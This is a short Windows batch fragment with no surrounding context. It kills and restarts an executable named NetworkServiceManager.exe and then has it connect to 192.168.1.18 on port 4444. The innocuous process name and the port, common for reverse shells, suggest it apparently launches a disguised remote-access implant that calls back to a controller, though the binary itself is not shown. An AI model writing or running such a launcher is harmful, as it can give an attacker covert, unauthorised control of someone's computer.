  echo @echo off
  taskkill /f /im NetworkServiceManager.exe >nul 2>&1
  timeout /t 1 >nul
  start NetworkServiceManager.exe -run
  timeout /t 1 >nul
  NetworkServiceManager.exe -connect 192.168.1.18::4444
